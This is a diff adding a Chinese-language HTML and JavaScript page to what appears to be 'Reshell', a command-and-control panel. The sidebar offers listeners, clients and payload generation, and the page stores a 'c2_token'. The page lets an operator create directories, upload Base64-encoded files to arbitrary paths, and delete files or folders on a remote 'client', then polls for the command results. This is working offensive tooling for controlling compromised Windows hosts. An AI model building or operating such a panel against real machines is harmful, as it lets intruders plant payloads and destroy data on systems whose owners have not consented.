@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>文件操作 - Reshell</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/static/bootstrap.min.css">
+    <link rel="stylesheet" href="/static/ruoyi.css">
+</head>
+<body class="page-files">
+<div class="layout-wrapper">
+    <aside class="layout-sidebar">
+        <div class="logo"><span>Reshell</span></div>
+        <ul class="layout-menu">
+            <li><a href="/dashboard">仪表盘</a></li>
+            <li><a href="/listeners">监听管理</a></li>
+            <li><a href="/clients" class="active">客户端管理</a></li>
+            <li><a href="/payloads">载荷生成</a></li>
+        </ul>
+    </aside>
+
+    <div class="layout-main">
+        <header class="layout-header">
+            <div class="layout-header-title">文件操作 - 客户端 #{{.ClientID}}</div>
+            <div class="layout-header-actions">
+                <a href="/files/{{.ClientID}}" class="btn btn-outline-secondary btn-sm">返回文件管理</a>
+            </div>
+        </header>
+
+        <main class="layout-content">
+            <div class="breadcrumb-bar">首页 / 客户端管理 / 文件管理 / 文件操作</div>
+
+            <div class="card mb-3">
+                <div class="card-header">当前目录</div>
+                <div class="card-body">
+                    <input id="base-path" class="form-control" value="{{.Path}}" placeholder="例如 C:\Users\Public">
+                </div>
+            </div>
+
+            <div class="card mb-3">
+                <div class="card-header">新建文件夹</div>
+                <div class="card-body">
+                    <div class="input-group">
+                        <input id="mkdir-name" class="form-control" placeholder="文件夹名或完整路径">
+                        <button class="btn btn-primary" onclick="createDirectory()">创建</button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card mb-3">
+                <div class="card-header">上传文件</div>
+                <div class="card-body">
+                    <div class="mb-2">
+                        <input id="upload-path" class="form-control" placeholder="目标完整路径，如 C:\Users\Public\a.txt">
+                    </div>
+                    <div class="mb-2">
+                        <textarea id="upload-content" rows="6" class="form-control" placeholder="Base64 内容"></textarea>
+                    </div>
+                    <button class="btn btn-success" onclick="uploadFile()">上传</button>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">删除路径</div>
+                <div class="card-body">
+                    <div class="mb-2">
+                        <input id="delete-path" class="form-control" placeholder="要删除的完整路径">
+                    </div>
+                    <div class="form-check mb-2">
+                        <input id="delete-is-dir" class="form-check-input" type="checkbox">
+                        <label for="delete-is-dir" class="form-check-label">目标是目录</label>
+                    </div>
+                    <button class="btn btn-danger" onclick="deletePath()">删除</button>
+                </div>
+            </div>
+        </main>
+    </div>
+</div>
+
+<script>
+    const clientId = '{{.ClientID}}';
+    const defaultAction = '{{.Action}}';
+
+    function getToken() {
+        return localStorage.getItem('c2_token') || '';
+    }
+
+    async function fetchJSON(url, opts = {}) {
+        opts.headers = Object.assign({
+            'Authorization': 'Bearer ' + getToken(),
+            'Content-Type': 'application/json'
+        }, opts.headers || {});
+        const res = await fetch(url, opts);
+        if (res.status === 401) {
+            window.location.href = '/login';
+            return null;
+        }
+        return res.json();
+    }
+
+    async function pollCommandResult(cmdId, okMsg) {
+        let attempts = 0;
+        while (attempts < 60) {
+            const data = await fetchJSON('/api/commands/' + cmdId + '/result');
+            if (data && data.status === 'completed') {
+                alert(okMsg || '操作成功');
+                return true;
+            }
+            if (data && data.status === 'failed') {
+                alert('操作失败: ' + (data.result || '未知错误'));
+                return false;
+            }
+            attempts++;
+            await new Promise(r => setTimeout(r, 1000));
+        }
+        alert('操作超时');
+        return false;
+    }
+
+    function joinPath(base, sub) {
+        const b = String(base || '').trim();
+        const s = String(sub || '').trim();
+        if (!s) return b;
+        if (s.includes(':\\') || s.startsWith('\\') || s.startsWith('/')) return s;
+        if (!b) return s;
+        const sep = b.endsWith('\\') || b.endsWith('/') ? '' : '\\';
+        return b + sep + s;
+    }
+
+    async function createDirectory() {
+        const base = document.getElementById('base-path').value;
+        const name = document.getElementById('mkdir-name').value;
+        const path = joinPath(base, name);
+        const data = await fetchJSON('/api/clients/' + clientId + '/files/mkdir', {
+            method: 'POST',
+            body: JSON.stringify({ path: path })
+        });
+        if (data && data.command_id) await pollCommandResult(data.command_id, '文件夹创建成功');
+    }
+
+    async function uploadFile() {
+        const path = document.getElementById('upload-path').value;
+        const content = document.getElementById('upload-content').value;
+        const data = await fetchJSON('/api/clients/' + clientId + '/files/upload', {
+            method: 'POST',
+            body: JSON.stringify({ remote_path: path, content: content })
+        });
+        if (data && data.command_id) await pollCommandResult(data.command_id, '上传成功');
+    }
+
+    async function deletePath() {
+        const path = document.getElementById('delete-path').value;
+        const isDir = document.getElementById('delete-is-dir').checked;
+        const data = await fetchJSON('/api/clients/' + clientId + '/files/delete', {
+            method: 'POST',
+            body: JSON.stringify({ path: path, is_dir: isDir })
+        });
+        if (data && data.command_id) await pollCommandResult(data.command_id, '删除成功');
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+        if (defaultAction === 'mkdir') document.getElementById('mkdir-name').focus();
+        if (defaultAction === 'upload') document.getElementById('upload-path').focus();
+        if (defaultAction === 'delete') document.getElementById('delete-path').focus();
+    });
+</script>
+</body>
+</html>
